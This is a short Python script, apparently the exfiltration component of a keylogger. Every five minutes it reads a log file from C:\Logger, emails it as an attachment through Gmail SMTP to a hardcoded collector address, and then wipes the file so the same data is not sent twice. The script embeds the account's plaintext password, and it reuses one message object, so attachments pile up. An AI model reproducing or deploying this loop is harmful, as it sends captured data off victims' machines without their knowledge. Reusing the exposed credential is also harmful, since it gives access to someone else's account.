import smtplib
import time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log_path = 'C:\\Logger\output.txt'

mail = smtplib.SMTP('smtp.gmail.com', 587)
msg = MIMEMultipart()
address = 'schimberglogcollector@gmail.com'
password = 'GkcmeXyuv33mzu'

#This seemed like the easiest way to implement a timer.
while True:
    #current time format for the subject line
    now = datetime.now()
    nowformatted = now.strftime("%B %d, %Y  %I:%M%p")
    #nowlogformat = now.strftime("%b/%d/%Y")


    msg['Subject'] = 'Log ' + nowformatted
    msg['From'] = address
    msg['To'] = address

    #encoding the log so it can be attached to the email.
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(log_path, "rb").read())
    encoders.encode_base64(part)
    
    part.add_header('Content-Disposition', 'attachment; filename="log.txt"')
    msg.attach(part)
   
    #server connection and actually sending the formatted email.
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(address,password)
    server.sendmail(address, address, msg.as_string())
    server.quit()
    
    ##should empty the log file so i dont get repeat info
    open(log_path, "w").close()

    #time is in seconds (loops every 5 mins)
    time.sleep(300)

## think of way to email the log before killing process.
## actually its unneeded because the log will just send next time the logger
## starts.
    
